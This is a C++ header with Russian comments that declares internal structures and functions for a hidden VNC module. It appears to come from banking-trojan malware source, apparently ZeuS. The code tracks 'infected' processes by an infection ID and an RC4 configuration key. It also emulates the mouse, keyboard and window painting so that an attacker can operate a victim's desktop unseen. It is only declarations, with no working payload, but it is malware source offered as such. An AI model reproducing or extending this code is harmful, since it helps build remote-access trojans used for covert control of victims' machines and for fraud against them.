/*
  Внутринни данные VNC.
*/
#pragma once

#if(BO_VNC > 0)

//Максимальный размер битмапа.
#define MAX_BITMAP_SIZE (4000 * 4000 * 4)

//Время даблклика.
#define MOUSE_DOUBLE_CLICK_DELAY 1000

//Таймаут для SendMessageTimeoutW().
#define SENDMESSAGE_TIMEOUT 100

//Условие, что поток работате в VNC-десктопе.
#define IS_VNC_PROCESS (coreData.proccessFlags & Core::CDPF_VNC_ACTIVE && Core::isActive())

//Типы сообщений VNC (wParam).
enum vncMessages:WPARAM
{
  VMW_EXECUTE_MENU    = (WPARAM)-1, //Исполнить команду меню
  VMW_HILITE_MENU     = (WPARAM)-2, //Подцветить команду меню.
  VMW_UPDATE_KEYSTATE = (WPARAM)-3, //Обновить состояние клавиш для потока.
  VMW_REMOTE_PAINT    = (WPARAM)-4  //Прорисовать удаленноеокно указное в lParam
};

//Флаги классов окон.
enum
{
  WCF_PAINTMETHOD_NOP         = 0x01, //Не рисовать.
  WCF_PAINTMETHOD_PAINT       = 0x02, //Перехват BeginPaint/EndPaint и т.д.
  WCF_PAINTMETHOD_PRINT       = 0x04, //WM_PRINT.
  WCF_PAINTMETHOD_PRINTWINDOW = 0x08, //PrintWindow.
  WCF_PAINTMETHOD_SKIP_HOOK   = 0x10, //Не вызыват через VNCPROCESSDATA.vncMessage.
  WCF_MOUSE_CLIENT_TO_SCREEN  = 0x20, //Отправлять все мышиные сообщения с координатами отностельно экрана.
  WCF_MOUSE_AUTOCAPTURE       = 0x40, //Автоматически променять SetCapture при наведении попадании мышы на окно.
};

//Глобальные данные VNC, проэктируются как OBJECT_ID_VNC_DATA_MAPFILE.
typedef struct
{
  BYTE keysState[256];      //Сосотояние кнопок мыши и клавиатуры.
  POINT cursorPoint;        //Координты курсора.
  
  //Данные для эмуляции SetCapture().
  struct
  {
    HWND window; //Окно с устанвленным захватом.
    DWORD tid;   //TID окна с захватом.
    WORD area;   //Область с которой начался захват, служит только для перемешения окон.
  }mouseCapture;

  //Данные для процесса рисования.
  struct
  {
    RECT ownerRect;  //Координаты родителя окна.
    bool retVal;     //Код возврата рисования.
  }paintProcess;
}VNCGLOBALDATA;

//Данные VNC-процесса.
typedef struct
{
  HANDLE mapFileHandle;      //Хэндл map-файла для всех процессов. (Core::OBJECT_ID_VNC_MAPFILE)
  DWORD tlsPaintIndex;       //TLS-индекс PAINTDATA.
  DWORD vncMessage;          //Оконное сообщение для копирования контекста окна или обнволения состояния глобальных данных
  HANDLE vncMessageEvent;    //Событие окончания выполенния vncMessage.
  VNCGLOBALDATA *globalData; //Глобальные данные.
  HANDLE globalDataMutex;    //Мютекс для globaData.
  
  //Данные для работы с DIB.
  struct
  {
    LPBYTE desktop;       //Битмап десктопа, который рисуется для VNC-клиента.

    //Временный битмап, в который рисуется каждое окно по отдельности.
    HBITMAP tempHandle;   //Хэндл.
    LPBYTE temp;          //Байты.

    RECT rect;            //Координаты десктопа (0, 0, width, height).
    DWORD widthInBytes;   //Ширина битмапа в пикселях, включая выравнивание.
    BYTE pixelSize;       //Размер пикселя в байтах.
  }dib;

  //Данные VNC-клиента. Используется серверной частьюы.
  struct
  {    
    //Данные необходимые для обнаружения зараженных процессов. 
    struct
    {
      GUID osGuid;             //PESETTINGS.osGuid.
      DWORD processInfecionId; //PESETTINGS.processInfecionId.
      Crypt::RC4KEY baseKey;   //BASECONFIG.rc4Key.
    }processDetectionData;

    //DC
    struct
    {
      HDC dc;                            //Memory DC в который будет рисоваться десктоп.
      HBITMAP orginalBitmap;             //Первоночальный битмап.
      HBITMAP sampleBitmap;              //Битмап с правильным количетсво цвета.
      HANDLE paintMutex;                 //Мютекс рисования окон.
    }dcData;

    //Состояние мыши.
    struct
    {
      DWORD lastDownTime;      //Время последненго нажатия кнопки мыши.
      DWORD lastDownMessage;   //Сообшение последнего нажатия кнопки мыши.
      HWND lastDownWindow;     //Окно, в которым был произведено нажатие.
      HWND lastTopLevelWindow; //Последнее TOP-окно, в котором присходило нажатие.
      HWND lastActiveWindow;
      DWORD lastActiveThreadId;
    }input;

    PROCESS_INFORMATION paintProcess; //Данные процесса рисования.
  }serverData;
}VNCPROCESSDATA;

extern VNCPROCESSDATA vncActiveProcessData;

////////////////////////////////////////////////////////////////////////////////////////////////////
//Функции.
////////////////////////////////////////////////////////////////////////////////////////////////////

/*
  Рисование декстопа.

  IN vncProcessData - VNCPROCESSDATA.
*/
void paintDesktop(VNCPROCESSDATA *vncProcessData);

/*
  Рисование окна.
  
  IN vncProcessData - VNCPROCESSDATA.
  IN window         - окно для печати.
  IN visibleRect    - видимая область для окна.
  IN isServer       - true - функция вызвана с сервера,
                      false - функция вызвана с зараженного процесса.
  
  Return            - true - окно нарисовано/пропущено,
                      false - окно не нарисовано.
*/
bool paintWindow(VNCPROCESSDATA *vncProcessData, HWND window, const RECT *visibleRect, bool isServer);

/*
  Обработка сообщений мыши.

  IN vncProcessData - VNCPROCESSDATA.
  IN flags          - Rfb::MOUSEEVENTF_*.
  IN x              - X.
  IN y              - Y.
  IN data           - допольнительные данные, согласно протоколу RFB.
*/
void mouseMessage(VNCPROCESSDATA *vncProcessData, DWORD flags, LONG x, LONG y, DWORD data);

/*
  Обработка сообщений клавиатуры.

  IN vncProcessData - VNCPROCESSDATA.
  IN keySym         - KeySym.
  IN down           - true - нажатие, false - отпсукание.
*/
void keyboardMessage(VNCPROCESSDATA *vncProcessData, DWORD keySym, bool down);

/*
  Обновление состояние кнопок мыши и клавиатуры.

  IN OUT vncProcessData - VNCPROCESSDATA.
  IN virtualKey         - клавиша для изменения, 0 - если не чего изменять не нужно.
  IN down               - true - нажать клавишу, false - отпустить клавишу.

  Return                - текущая маска MK_* для мышиных сообщений.
*/
WORD updateInputState(VNCPROCESSDATA *vncProcessData, BYTE virtualKey, bool down);

/*
  Выбираем метод рисования окна.

  IN window - окно.

  Return - PWM_*.
*/
WORD getWindowClassFlags(HWND window);

/*
  Проверяет инифицирован ли процесс окна.

  IN vncProcessData - VNCPROCESSDATA.
  IN window         - окно.

  Return            - true - инифицирован,
                      false - не инифицирован.
*/
bool isWindowInfected(VNCPROCESSDATA *vncProcessData, HWND window);

#endif
